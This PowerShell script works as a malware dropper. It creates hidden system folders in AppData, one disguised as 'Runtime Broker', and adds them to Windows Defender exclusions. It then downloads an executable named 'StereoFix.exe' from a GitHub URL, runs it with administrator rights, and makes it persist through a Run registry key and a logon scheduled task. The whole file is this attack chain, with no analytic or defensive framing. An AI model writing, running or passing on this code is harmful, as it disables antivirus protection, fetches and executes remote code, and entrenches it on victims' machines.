#Requires -RunAsAdministrator

# Dynamic path setup for current user
$userProfile = [Environment]::GetFolderPath('UserProfile')
$appDataRoaming = [Environment]::GetFolderPath('ApplicationData')
$hiddenBaseDir = "$appDataRoaming\SubDir"
$runtimeBrokerDir = "$appDataRoaming\Runtime Broker"

# Create hidden directories
$directories = @($hiddenBaseDir, $runtimeBrokerDir)
foreach ($dir in $directories) {
    if (-not (Test-Path $dir)) {
        New-Item -Path $dir -ItemType Directory -Force | Out-Null
        attrib +h +s "$dir"  # Hide and add system attribute
        Write-Host "Created hidden directory: $dir"
    } else {
        Write-Host "Directory already exists: $dir"
    }
}

# Add both paths to Windows Defender exclusions
$exclusionPaths = @($hiddenBaseDir, $runtimeBrokerDir)
foreach ($path in $exclusionPaths) {
    try {
        Add-MpPreference -ExclusionPath $path -ErrorAction Stop
        Write-Host "Successfully added to Defender exclusions: $path"
    } catch {
        Write-Warning "Failed to add exclusion for $path : $_"
    }
}

# Download and execute the file
$downloadUrl = "https://github.com/salamprajjit-alt/5132525231/raw/main/StereoFix.exe"
$exePath = "$hiddenBaseDir\StereoFix.exe"

try {
    # Download the file
    Invoke-WebRequest -Uri $downloadUrl -OutFile $exePath -ErrorAction Stop
    Write-Host "Download completed: $exePath"
    
    # Verify file exists before execution
    if (Test-Path $exePath) {
        # Execute with admin privileges
        Start-Process -FilePath $exePath -Verb RunAs -ErrorAction Stop
        Write-Host "Execution started with admin privileges"
        
        # Add to startup via Registry (Current User)
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name "StereoFix" -Value $exePath -ErrorAction Stop
        Write-Host "Added to startup via Registry"
        
        # Additional startup persistence via Task Scheduler
        $taskAction = New-ScheduledTaskAction -Execute $exePath
        $taskTrigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
        $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName "StereoFix" -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Force -ErrorAction Stop
        Write-Host "Added to startup via Task Scheduler"
    } else {
        Write-Error "Downloaded file not found at: $exePath"
    }
} catch {
    Write-Error "Error during download/execution: $_"
}

# Verify exclusions (optional)
Write-Host "Current Defender Exclusions:"
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath